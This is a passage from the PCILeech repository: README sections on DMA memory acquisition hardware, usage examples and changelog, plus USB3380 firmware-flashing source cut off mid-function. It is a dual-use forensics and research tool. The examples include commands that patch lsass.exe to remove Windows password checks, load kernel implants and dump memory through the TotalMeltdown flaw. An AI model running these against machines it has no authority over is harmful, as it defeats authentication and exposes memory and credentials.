* Retrieve remote memory from remote LeechService.
* Write data to the target system memory. 
* 4GB memory can be accessed in native DMA mode (USB3380 hardware).
* ALL memory can be accessed in native DMA mode (FPGA hardware).
* ALL memory can be accessed if kernel module (KMD) is loaded.
* Raw PCIe TLP access (FPGA hardware).
* Mount live RAM as file [Linux, Windows, macOS Sierra*].
* Mount file system as drive [Linux, Windows, macOS Sierra*].
* Execute kernel code on the target system.
* Spawn system shell and other executables [Windows].
* Pull and Push files [Linux, FreeBSD, Windows, macOS Sierra*].
* Patch / Unlock (remove password requirement) [Windows, macOS Sierra*].
* Easy to create own kernel shellcode and/or custom signatures.
* Connect to a remote LeechAgent over the network to remotely:
   * Dump physical memory over the network.
   * Execute Python memory analysis scripts on the remote host.
* Even more features not listed here ...

\*) macOS High Sierra and above are not supported.

Memory Acquisition Methods:
===========================
PCILeech supports both hardware based and software based memory acqusition methods. All memory acqusition is handled by the [LeechCore](https://github.com/ufrisk/LeechCore) library.

### Hardware based memory aqusition methods:

Please find a summary of the supported hardware based memory acquisition methods listed below. All hardware based memory acquisition methods are supported on both Windows and Linux. The FPGA based methods however sports a slight performance penalty on Linux and will max out at approx: 90MB/s compared to 150MB/s on Windows.

| Device                                                                 | Type | Interface | Speed | 64-bit memory access | PCIe TLP access | Plugin | Project<br>Sponsor |
| -----------------------------------------------------------------------| ---- | --------- | ----- | -------------------- | --------------- | ------ | ------------------ |
| [Enigma X1](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)      | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/EnigmaX1)     | USB-C | 180MB/s | Yes | Yes | No  | 💖 |
| [PCIeScreamerR04](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)| [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/ScreamerM2)   | USB-C | 150MB/s | Yes | Yes | No  | 💖 |
| [ScreamerM2](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)     | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/ScreamerM2)   | USB3  | 150MB/s | Yes | Yes | No  | 💖 |
| [AC701/FT601](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)    | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/ac701_ft601)  | USB3  | 150MB/s | Yes | Yes | No  |    |
| [PCIeScreamer](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)   | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/pciescreamer) | USB3  | 100MB/s | Yes | Yes | No  |    |
| [SP605/FT601](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)    | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/sp605_ft601)  | USB3  |  75MB/s | Yes | Yes | No  |    |
| [Acorn/FT2232H](https://github.com/ufrisk/LeechCore/wiki/Device_FPGA)  | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/acorn_ft2232h)| USB2  |  25MB/s | Yes | Yes | No  |    |
| [NeTV2/UDP](https://github.com/ufrisk/LeechCore/wiki/Device_RawUDP)    | [FPGA](https://github.com/ufrisk/pcileech-fpga/tree/master/NeTV2)        | UDP   |   7MB/s | Yes | Yes | No  |    |
| [USB3380-EVB](https://github.com/ufrisk/LeechCore/wiki/Device_USB3380) | USB3380 | USB3 | 150MB/s | No  | No  | No  |    |
| [PP3380](https://github.com/ufrisk/LeechCore/wiki/Device_USB3380)      | USB3380 | USB3 | 150MB/s | No  | No  | No  |    |
| [SP605/TCP](https://github.com/ufrisk/LeechCore/wiki/Device_SP605TCP)  | FPGA    | TCP  | 100kB/s | Yes | Yes | Yes |    |
| [DMA patched HP iLO](https://github.com/ufrisk/LeechCore/wiki/Device_RawTCP) | BMC | TCP |  1MB/s | Yes | No  | Yes |    |

### Software based memory aqusition methods:

Please find a summary of the supported software based memory acquisition methods listed below. Please note that the LeechService only provides a network connection to a remote LeechCore library. It's possible to use both hardware and software based memory acquisition once connected.

| Device                     | Type             | Volatile | Write | Linux Support | Plugin |
| -------------------------- | ---------------- | -------- | ----- | ------------- | ------ |
| [RAW physical memory dump](https://github.com/ufrisk/LeechCore/wiki/Device_File)         | File             | No  | No  | Yes | No  |
| [Full Microsoft Crash Dump](https://github.com/ufrisk/LeechCore/wiki/Device_File)        | File             | No  | No  | Yes | No  |
| [Full ELF Core Dump](https://github.com/ufrisk/LeechCore/wiki/Device_File)               | File             | No  | No  | Yes | No  |
| [VMware](https://github.com/ufrisk/LeechCore/wiki/Device_VMWare)                         | Live&nbsp;Memory | Yes | Yes | No  | No  |
| [VMware memory save file](https://github.com/ufrisk/LeechCore/wiki/Device_File)          | File             | No  | No  | Yes | No  |
| [TotalMeltdown](https://github.com/ufrisk/LeechCore/wiki/Device_Totalmeltdown)           | CVE-2018-1038    | Yes | Yes | No  | No  |
| [DumpIt /LIVEKD](https://github.com/ufrisk/LeechCore/wiki/Device_DumpIt)                 | Live&nbsp;Memory | Yes | No  | No  | No  |
| [WinPMEM](https://github.com/ufrisk/LeechCore/wiki/Device_WinPMEM)                       | Live&nbsp;Memory | Yes | No  | No  | No  |
| [LiveKd](https://github.com/ufrisk/LeechCore/wiki/Device_LiveKd)                         | Live&nbsp;Memory | Yes | No  | No  | No  |
| [LiveCloudKd](https://github.com/ufrisk/LeechCore/wiki/Device_LiveCloudKd)               | Live&nbsp;Memory | Yes | Yes | No  | Yes |
| [Hyper-V Saved State](https://github.com/ufrisk/LeechCore/wiki/Device_HyperV_SavedState) | File             | No  | No  | No  | Yes |
| [LeechAgent*](https://github.com/ufrisk/LeechCore/wiki/Device_Remote)                    | Remote           |     |     | No  | No  |

Installing PCILeech:
====================
Please ensure you do have the most recent version of PCILeech by visiting the PCILeech github repository at: https://github.com/ufrisk/pcileech

<b>Get the latest [binaries, modules and configuration files](https://github.com/ufrisk/pcileech/releases/latest) from the latest release.</b> Alternatively clone the repository and build from source.

#### Windows:

Please see the [PCILeech on Windows](https://github.com/ufrisk/pcileech/wiki/PCILeech-on-Windows) guide for information about running PCILeech on Windows.

The Google Android USB driver have to be installed if USB3380 hardware is used. Download the Google Android USB driver from: http://developer.android.com/sdk/win-usb.html#download Unzip the driver.<br>
FTDI drivers have to be installed if FPGA is used with FT601 USB3 addon card or PCIeScreamer. Download the 64-bit [`FTD3XX.dll`](https://www.ftdichip.com/Drivers/D3XX/FTD3XXLibrary_v1.3.0.4.zip) from FTDI and place it alongside `pcileech.exe`.<br>
To mount live ram and target file system as drive in Windows the Dokany2 file system library must be installed. Please download and install the latest stable version of Dokany2 at: https://github.com/dokan-dev/dokany/releases/latest

#### Linux:
Please see the [PCILeech on Linux](https://github.com/ufrisk/pcileech/wiki/PCILeech-on-Linux) guide for information about running PCILeech on Linux.

Examples:
=========

Please see the [project wiki pages](https://github.com/ufrisk/pcileech/wiki/) for more examples. The wiki is in a buildup phase and information may still be missing.

Mount target system live RAM and file system, requires that a KMD is loaded. In this example 0x11abc000 is used.
* ` pcileech.exe mount -kmd 0x11abc000 `

Show help for a specific kernel implant, in this case lx64_filepull kernel implant.
* ` pcileech.exe lx64_filepull -help `

Show help for the dump command.
* ` pcileech.exe dump -help `

Dump all memory from the target system given that a kernel module is loaded at address: 0x7fffe000.
* ` pcileech.exe dump -kmd 0x7fffe000 `

Force dump memory below 4GB including accessible memory mapped devices using more stable USB2 approach on USB3380.
* ` pcileech.exe dump -force -device usb3380://usb=2 `

Receive PCIe TLPs (Transaction Layer Packets) and print them on screen (correctly configured FPGA dev board required).
* ` pcileech.exe tlp -vv -wait 1000 `

Probe/Enumerate the memory of the target system for readable memory pages and maximum memory. (FPGA hardware only).
* ` pcileech.exe probe `

Dump all memory between addresses min and max, don't stop on failed pages. Native access to 64-bit memory is only supported on FPGA hardware.
* ` pcileech.exe dump -min 0x0 -max 0x21e5fffff -force `

Dump all memory, try locate the memory map from the target system registry to avoid dumping potentially invalid memory which may freeze the target.
* ` pcileech.exe dump -memmap auto `

Force the usage of a specific device (instead of default auto detecting it). The pmem device is not auto detected.
* ` pcileech.exe pagedisplay -min 0x1000 -device pmem `

Dump remote memory from a remote LeechAgent using connection encrypted and mutually authenticated by kerberos.
* ` pcileech.exe dump -device pmem -remote rpc://computer$@ad.contoso.com `

Execute the Python analysis script `find-rwx.py` on a remote computer using the LeechAgent embedded Python environment.
* ` pcileech.exe agent-execpy -in find-rwx.py -device pmem -remote rpc://computer$@ad.contoso.com `

Dump memory using the the reported "TotalMeltdown" [Windows 7/2008R2 x64 PML4 page table permission vulnerability](https://blog.frizk.net/2018/03/total-meltdown.html).
* ` pcileech.exe dump -out memdump_win7.raw -device totalmeltdown -v -force `

Insert a kernel module into a running Linux system remotely via a [DMA patched HP iLO](https://www.synacktiv.com/posts/exploit/using-your-bmc-as-a-dma-device-plugging-pcileech-to-hpe-ilo-4.html).
* ` pcileech.exe kmdload -vvv -device -device RawTCP://127.0.0.1:8888 -kmd LINUX_X64_48 `

Patch virtual process memory of pid 432 (lsass.exe in this example).
* ` pcileech.exe patch -pid 432 -sig unlock_win10x64.sig `

Limitations/Known Issues:
=========================
* Does not work if the OS uses the IOMMU/VT-d. This is the default on macOS (unless disabled in recovery mode). Windows 10 with Virtualization based security features enabled does not work fully - this is however not the default setting in Windows 10 or Linux.
* Some Linux kernels does not work. Sometimes a required symbol is not exported in the kernel and PCILeech fails.
* File system mount support only exists for Windows (Linux version is planned).
* Remote connectivity support only exists for Windows.

Building:
=========
The binaries are found in the [releases section](https://github.com/ufrisk/pcileech/releases/latest) of this repository. If one wish to build an own version it is possible to do so. Please see the [PCILeech on Windows](https://github.com/ufrisk/pcileech/wiki/PCILeech-on-Windows) or [PCILeech on Linux](https://github.com/ufrisk/pcileech/wiki/PCILeech-on-Linux) for more information about building PCILeech. PCILeech is also dependant on LeechCore and optionally (for some extra functionality) on The Memory Process File System which must both be built separately.

Contributing:
=============
PCILeech, MemProcFS and LeechCore are open source but not open contribution. PCILeech, MemProcFS and LeechCore offers a highly flexible plugin architecture that will allow for contributions in the form of plugins. If you wish to make a contribution, other than a plugin, to the core projects please contact me before starting to develop.

Links:
======
* Twitter: [![Twitter](https://img.shields.io/twitter/follow/UlfFrisk?label=UlfFrisk&style=social)](https://twitter.com/intent/follow?screen_name=UlfFrisk)
* Discord: [![Discord | Porchetta Industries](https://img.shields.io/discord/736724457258745996.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/sEkn3aa)
* PCILeech: https://github.com/ufrisk/pcileech
* PCILeech FPGA: https://github.com/ufrisk/pcileech-fpga
* LeechCore: https://github.com/ufrisk/LeechCore
* MemProcFS: https://github.com/ufrisk/MemProcFS
* YouTube: https://www.youtube.com/channel/UC2aAi-gjqvKiC7s7Opzv9rg
* Blog: http://blog.frizk.net
* PushPin: GUI for PCILeech: https://github.com/LuckyPi/PushPin

Support PCILeech/MemProcFS development:
=======================================
PCILeech and MemProcFS is free and open source!

I put a lot of time and energy into PCILeech and MemProcFS and related research to make this happen. Some aspects of the projects relate to hardware and I put quite some money into my projects and related research. If you think PCILeech and/or MemProcFS are awesome tools and/or if you had a use for them it's now possible to contribute by becoming a sponsor! 
 
If you like what I've created with PCIleech and MemProcFS with regards to DMA, Memory Analysis and Memory Forensics and would like to give something back to support future development please consider becoming a sponsor at: [`https://github.com/sponsors/ufrisk`](https://github.com/sponsors/ufrisk)

To all my sponsors, Thank You 💖 

All sponsorships are welcome, no matter how large or small. I especially wish to thank my **bronze sponsors**: [grandprixgp](https://github.com/grandprixgp).

Changelog:
==========
<details><summary>Previous releases (click to expand):</summary>

v1.0-v3.6
* Initial release and various updates. please see individual relases for more information.

v4.0
* Major cleanup and internal refactorings.
* FPGA max memory auto-detect and more stable dumping strategy.
* New stable Windows 10 kernel injects with FPGA hardware on non-virtualization based security systems.
* User mode injects (experimental).
* Removal of built-in device support - the [LeechCore](https://github.com/ufrisk/LeechCore) `leechcore.dll`/`leechcore.so` library is now used instead. New devices include:
  * Memory dump files (raw linear dump files and microsoft crash dump files).
  * Hyper-V save files.
  * Live memory via DumpIt / WinPmem.
  * remote devices via -remote setting.
* Removal of API and built-in _Memory Process File System_ - please use the more capable APIs in the [LeechCore](https://github.com/ufrisk/LeechCore) and [Memory Process File System](https://github.com/ufrisk/MemProcFS) instead.
* Multiple other changes and syntax updates.

v4.1
* LeechAgent support - remote memory acquisition and analysis.

[v4.2](https://github.com/ufrisk/pcileech/releases/tag/v4.2)
* Signature updates:
  * Linux kernel module - LINUX_X64_48 (latest versions)
  * Win10 1903 kernel module - WIN10_X64_2 (requires windows version of PCILeech)
  
[v4.3](https://github.com/ufrisk/pcileech/releases/tag/v4.3)
* Bug fixes.
* Support for new device (NeTV2 / RawUDP) via LeechCore library.

[v4.4](https://github.com/ufrisk/pcileech/releases/tag/v4.4)
* Bug fixes and stability improvements.
* Support for MemProcFS v3 library.
* Code signing of binaries.
* "tlploop" command.

[v4.5](https://github.com/ufrisk/pcileech/releases/tag/v4.5)
* Bug fixes.
* Support for v2 of the LeechCore memory acquisition library.
* MemProcFS integration when running on Windows.
* Support for user-defined physical memory map (-memmap option).

[v4.6](https://github.com/ufrisk/pcileech/releases/tag/v4.6)
* Support for [LiveCloudKd](https://github.com/ufrisk/LeechCore/wiki/Device_LiveCloudKd).

[v4.7](https://github.com/ufrisk/pcileech/releases/tag/v4.7)
* Bug fixes.
* WIN10_X64_3 new stable kernel signature for Windows 10 - including Win10 2004 release.
* Unlock signature updates - Win10/Linux (NB! most recent kernels on Linux not yet supported).

[v4.8](https://github.com/ufrisk/pcileech/releases/tag/v4.8)
* Bug fixes.
* Better support for recent x64 Linux kernels.

[v4.9](https://github.com/ufrisk/pcileech/releases/tag/v4.9)
* Bug fixes.
* Signature updates.
* Better support for recent x64 Linux kernels (Ubuntu 21.04).
* Unmount of monted driver when CTRL+C pressed.
  </details>

[v4.10](https://github.com/ufrisk/pcileech/releases/tag/v4.10)
* Linux support for Windows 10 built-in signatures (dependency on MemProcFS v4.0).
* Separate releases for Windows and Linux.
* General cleanup.

[v4.11](https://github.com/ufrisk/pcileech/releases/tag/v4.11)
* Support for VMWare Workstation/Player live VM memory.
* Support for remote memory analysis with LeechAgent `agent-forensic` command.
  * Runs MemProcFS forensic mode remotely.
  * Retrieves ElasticSearch compatible JSON data.

[v4.12](https://github.com/ufrisk/pcileech/releases/tag/v4.12)
* 32-bit support (pcileech binary).

[v4.13](https://github.com/ufrisk/pcileech/releases/tag/v4.13)
* Bug fixes.
* Mount improvements:
  - Windows host file system support: Upgrade to [Dokany2](https://github.com/dokan-dev/dokany/releases) (NB! Dokany2 will have to be installed!).
  - Linux host file system support: FUSE support added. <br/>Example: `./pcileech mount /home/user/fusemnt/leechfs -kmd <your_kmd_address>`
  - Now possible to access other local drives than C: on Windows targets.
* Visual Studio 2022 Support.

[v4.14](https://github.com/ufrisk/pcileech/releases/tag/v4.14)
* Process Virtual Memory support (Windows only).
  - Commands: search, patch, write, display, pagedisplay
  - Example:  pcileech patch -pid 732 -sig unlock_win10x64.sig

```

`usb3380.md`:

```md
USB3380 Hardware:
=================
PCILeech uses PCIe hardware devices to read and write from the target system memory. This is achieved by using DMA over PCIe. No drivers are needed on the target system. Check out the [PCILeech](readme.md) project for general information.

PCILeech supports multiple hardware. USB3380 based hardware is only able to read 4GB of memory natively, but is able to read all memory if a kernel module (KMD) is first inserted into the target system kernel. FPGA based hardware is able to read all memory.

<img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_mbp.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_m2.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_shadow.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_dump.gif" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_mount.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/314e527e13e78edd44cc6db2b7c05cfa4a1ce322/_gh_android.jpg" height="150"/>

PCILeech use the PLX Technologies USB3380 chip. The actual chip can be purchased for around $15, but it's more convenient to purchase a development board on which the chip is already mounted. Development boards can be purchased from BPlus Technology, or on eBay / Ali Express. Please note that adapters may be required too depending on your requirements. Please also note that the USB3380 is currently sold out.

http://www.bplus.com.tw/PLX.html

The hardware confirmed working is:
* USB3380-EVB mini-PCIe card.
* PP3380-AB PCIe card.

Please note that the ExpressCard EC3380-AB is not working!

Please note that the USB3380-AB EVK-RC kit is not working!

Flashing Hardware:
==================
In order to turn the USB3380 development board into a PCILeech device it must be flashed. Flashing may be done in Windows 10 (as administrator) or in Linux (as root). The board must be connected to the system via PCIe when performing the initial flash.

To flash in Windows 10 unzip all contents of the ` flash.zip ` archive found in ` pcileech_files `. Run ` PCILeechFlash_Installer.exe `and follow the instructions.

Flashing in 32-bit Windows or in Windows 7 is not supported.

If flashing fails or if Linux is preferred please see [pcileech_flash/linux](pcileech_flash/linux) for instructions.

```

`usb3380_flash/linux/Makefile`:

```
obj-m += pcileech_flash.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

`usb3380_flash/linux/pcileech_flash.c`:

```c
// pcileech_flash.c : Linux kernel module to flash the USB3380 into a PCILeech device.
//
// (c) Ulf Frisk, 2016. 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// Compiling:
//  - In order to compile the required flash kernel module please go to the folder with
//    this file and type make. GCC and kernel headers are required.  If successful read
//    the usage section below.
// Usage:
//  - Insert PCILeech card in computer via PCIe/mPCIe/ExpressCard/Thunderbolt (not USB)
//  - run 'insmod pcileech_flash.ko'.   If the module is successfully inserted then the
//    flash operation was successful.   If flashing the USB3380-EVB device the blue LED
//    will be lit upon success.  Run 'rmmod pcileech_flash' to clean up the module from
//    the kernel.      In order to enable the PCILeech functionality the device must be
//    removed from (re-inserted into) the computer.
//  - If flashing fails; please check 'dmesg' for logs.  If you are flashing the PP3380
//    please ensure that the J3 jumper is bridged.  If it fails for unknown reasons try
//    rebooting and try again.
// Warning:
//    Flashing hardware may result in bricked hardware. The author of this module takes
//    no responsiblity for this code. The code is provided as is. Use at your own risk.
//

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/pci.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ulf Frisk");
MODULE_DESCRIPTION("PCILeech Firmware Automatic Flasher");

// -----------------------------------------------------------------------------
// START SHARED CODE WITH WINDOWS/LINUX FLASH PCILEECH FIRMWARE
// -----------------------------------------------------------------------------

#define OFFSET_USBREG_GPIO			0x50
#define OFFSET_PCIREG_VEN_DEV		0x1000
#define OFFSET_PCIREG_SUBSYS		0x102c
#define OFFSET_PCIREG_EEPROM_CTL	0x1260
#define OFFSET_PCIREG_EEPROM_DATA	0x1264
#define DEVICE_WAIT_TIME			10
#define SET_LED(v)					*(unsigned int*)(pbar0 + OFFSET_USBREG_GPIO) = (0x0000000f & v) | 0xf0

static const unsigned char g_firmware_pcileech[] = {
	0x5a, 0x00, 0x2a, 0x00, 0x23, 0x10, 0x49, 0x38, 0x00, 0x00, 0x00, 0x00, 0xe4, 0x14, 0xbc, 0x16,
	0xc8, 0x10, 0x02, 0x06, 0x04, 0x00, 0xd0, 0x10, 0x84, 0x06, 0x04, 0x00, 0xd8, 0x10, 0x86, 0x06,
	0x04, 0x00, 0xe0, 0x10, 0x88, 0x06, 0x04, 0x00, 0x21, 0x10, 0xd1, 0x18, 0x01, 0x90, 0x00, 0x00 };

static int _action_flash_verify(unsigned char *pbar0)
{
	unsigned int dwdata, dwaddr = 0;
	while(dwaddr < sizeof(g_firmware_pcileech)) {
		// write to CTL register to start EEPROM read (and wait for device)
		dwdata = *(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL);
		dwdata = (0x00ff0000 & dwdata) | 0x00006000 | (dwaddr >> 2);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) = dwdata;
		msleep(DEVICE_WAIT_TIME);
		if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_DATA) != *(unsigned int*)(g_firmware_pcileech + dwaddr)) {
			return -1;
		}
		dwaddr += 4;
	}
	return 0;
}

static void _action_flash_write(unsigned char *pbar0)
{
	unsigned int dwdata, dwaddr = 0;
	while(dwaddr < sizeof(g_firmware_pcileech)) {
		// write enable latch (and wait for device)
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 1) = 0xc0;
		msleep(DEVICE_WAIT_TIME);
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 1) = 0x00;
		msleep(DEVICE_WAIT_TIME);
		// write EEPROM data
		dwdata = *(unsigned int*)(g_firmware_pcileech + dwaddr);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_DATA) = dwdata;
		// write to CTL register to start EEPROM write (and wait for device)
		dwdata = *(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL);
		dwdata = (0x00ff0000 & dwdata) | 0x03004000 | (dwaddr >> 2);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) = dwdata;
		msleep(DEVICE_WAIT_TIME);
		// next DWORD
		dwaddr += 4;
	}
}

static int _action_flash_writeverify(unsigned char *pbar0)
{
	// 1: check if this is a valid device / memory range.
	if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_SUBSYS) != 0x338010B5) {
		return -2;
	}
	if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_VEN_DEV) != 0x338010B5 && *(unsigned int*)(pbar0 + OFFSET_PCIREG_VEN_DEV) != 0x16BC14E4) {
		return -2;
	}
	// 2: check if EEPROM exists
	if((*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) & 0x00030000) == 0) {
		return -3;
	}
	// 4: is firmware already flashed?
	if(0 == _action_flash_verify(pbar0)) {
		SET_LED(0xf); // success -> blue+red led
		return 0;
	}
	// 4: flash firmware.
	_action_flash_write(pbar0);
	// 5: verify flashed firmware.
	if(0 == _action_flash_verify(pbar0)) {
		SET_LED(0x8); // success -> blue led
		return 0;
	}
	SET_LED(0x7); // fail -> red led
	return -1;
}

// -----------------------------------------------------------------------------
// END SHARED CODE WITH WINDOWS/LINUX FLASH PCILEECH FIRMWARE
// -----------------------------------------------------------------------------

static int _action_flash_2(struct pci_dev *pdev)
{
	int ret;
	unsigned char *pbar0;
	// enable the device
	if((ret = pci_enable_device(pdev))) {
		printk(KERN_ERR "PCILEECH FLASH: ERROR: Failed to enable PCIe device.\n");
		return ret;
	}
	// take ownership of pci related regions
	if((ret = pci_request_regions(pdev, "expdev"))) {
		printk(KERN_ERR "PCILEECH FLASH: ERROR: Cannot request regions.\n");
		goto error;
	}
	// checking if PCI-device reachable by checking that BAR0 is defined and memory mapped
	if(!(pci_resource_flags(pdev, 0) & IORESOURCE_MEM)) {
		printk(KERN_ERR "PCILEECH FLASH: ERROR: BAR0 configuration not found.\n");
		goto error;
	}
	// remap BAR0 avoiding the use of CPU cache
	pbar0 = ioremap_nocache(pci_resource_start(pdev, 0), pci_resource_len(pdev, 0));
	ret = _action_flash_writeverify(pbar0);
	if(ret) {
		// try force 1-byte addressing and make another flash attempt.
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 2) =
		0x60 | (0x1f & *(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 2));
		ret = _action_flash_writeverify(pbar0);
	}
	if(ret) {
		// try force 2-byte addressing and make another flash attempt.
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 2) =
		  0xa0 | (0x1f & *(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 2));
		ret = _action_flash_writeverify(pbar0); 
	}
	iounmap(pbar0);
	if(ret) {
		printk(KERN_ERR "PCILEECH FLASH: ERROR: Firmware write/verify not successful. Error: %08x\n", ret);
	} else {
		printk(KERN_ERR "PCILEECH FLASH: SUCCESSFUL: Please re-insert the device to use as a PCILeech device!\n");
	}
error:
	pci_release_regions(pdev);
	pci_disable_device(pdev);
	return ret ? -ENODEV : 0;
}

static int _action_flash_1(void) {
	int ret;
	bool is_dev_found = false;
	struct pci_dev *pdev = NULL;
	// retrieve compatible devices
	while((pdev = pci_get_device(0x14e4, 0x16bc, pdev))) {
		printk(KERN_INFO "PCILEECH FLASH: Found USB3380 already flashed as PCILeech.\n");
		ret = _action_flash_2(pdev);
		is_dev_found = true;
	}
	while((pdev = pci_get_device(0x10b5, 0x3380, pdev))) {
		printk(KERN_INFO "PCILEECH FLASH: Found USB3380 not flashed as PCILeech.\n");
		ret = _action_flash_2(pdev);
		is_dev_found = true;
	}
	if(!is_dev_found) {
		printk(KERN_ERR "PCILEECH FLASH: ERROR: Device not found.\n");
		return -ENODEV;
	}
	return ret;
}

static int pcileech_flash_init(void) {
	printk(KERN_INFO "PCILEECH FLASH: Module init called.\n");
	return _action_flash_1();
}

static void pcileech_flash_exit(void) {
	printk(KERN_INFO "PCILEECH FLASH: Module exit called.\n");
}

module_init(pcileech_flash_init);
module_exit(pcileech_flash_exit);

```

`usb3380_flash/linux/readme.md`:

```md
Flashing Hardware in Linux:
===============================
In order to turn the USB3380 development board into a PCILeech device it must be flashed. Flashing in Linux must be done as root. Download the source code for the flash kernel module to build. The files are found in the pcileech_flash/linux folder and are named: pcileech_flash.c and Makefile. The card must be connected to the Linux system doing the flashing via PCIe.

NB! If flashing the PP3380 PCIe card the J3 jumper must be bridged to connect the EEPROM. This is not necessary for the USB3380-EVB mini-PCIe card.

* ` cd /pathtofiles `
* ` make `
* [ insert USB3380 hardware into computer ]
* ` insmod pcileech_flash.ko `

The insmod command must be run as root. If compilation fails you might have to install dependencies before you try again. On debian based systems - such as debian, ubuntu and kali, run ` apt-get update && apt-get install gcc make linux-headers-$(uname -r) ` and try again.

If module insertion is successful flashing is also successful. In order to activate the flashed PCILeech device it must be power-cycled. Re-inserting it in the computer will achieve this. If one wish to flash more devices then unload the pcileech_flash kernel module by issuing the command: ` rmmod pcileech_flash `. If there is an error flashing is unsuccessful. Please try again and check any debug error messages by issing the command: ` dmsg `.

Alternative Flash using uflash:
======================================
If the above method using a kernel module fails or isn't desirable you may also use the [uflash utility](https://github.com/ANSSI-FR/pciemem/tree/master/uflash) by Yves-Alexis Perez / ANSSI-FR. It must be run as root but should build without any special dependencies.

```

`usb3380_flash/linux/readme_flash.txt`:

```txt
Please consult the documentation in pcileech_flash.c for more information.

```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.c`:

```c
// installer.c : implementation of the PCILeech UMDF2 flash driver.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "USB3380Flash.h"

// -----------------------------------------------------------------------------
// START SHARED CODE WITH WINDOWS/LINUX FLASH PCILEECH FIRMWARE
// -----------------------------------------------------------------------------

#define msleep						Sleep
#define OFFSET_USBREG_GPIO			0x50
#define OFFSET_PCIREG_VEN_DEV		0x1000
#define OFFSET_PCIREG_SUBSYS		0x102c
#define OFFSET_PCIREG_EEPROM_CTL	0x1260
#define OFFSET_PCIREG_EEPROM_DATA	0x1264
#define DEVICE_WAIT_TIME			10
#define SET_LED(v)					*(unsigned int*)(pbar0 + OFFSET_USBREG_GPIO) = (0x0000000f & v) | 0xf0

static const unsigned char g_firmware_pcileech[] = {
	0x5a, 0x00, 0x2a, 0x00, 0x23, 0x10, 0x49, 0x38, 0x00, 0x00, 0x00, 0x00, 0xe4, 0x14, 0xbc, 0x16,
	0xc8, 0x10, 0x02, 0x06, 0x04, 0x00, 0xd0, 0x10, 0x84, 0x06, 0x04, 0x00, 0xd8, 0x10, 0x86, 0x06,
	0x04, 0x00, 0xe0, 0x10, 0x88, 0x06, 0x04, 0x00, 0x21, 0x10, 0xd1, 0x18, 0x01, 0x90, 0x00, 0x00 };

static int _action_flash_verify(unsigned char *pbar0)
{
	unsigned int dwdata, dwaddr = 0;
	while(dwaddr < sizeof(g_firmware_pcileech)) {
		// write to CTL register to start EEPROM read (and wait for device)
		dwdata = *(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL);
		dwdata = (0x00ff0000 & dwdata) | 0x00006000 | (dwaddr >> 2);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) = dwdata;
		msleep(DEVICE_WAIT_TIME);
		if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_DATA) != *(unsigned int*)(g_firmware_pcileech + dwaddr)) {
			return -1;
		}
		dwaddr += 4;
	}
	return 0;
}

static void _action_flash_write(unsigned char *pbar0)
{
	unsigned int dwdata, dwaddr = 0;
	while(dwaddr < sizeof(g_firmware_pcileech)) {
		// write enable latch (and wait for device)
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 1) = 0xc0;
		msleep(DEVICE_WAIT_TIME);
		*(unsigned char*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL + 1) = 0x00;
		msleep(DEVICE_WAIT_TIME);
		// write EEPROM data
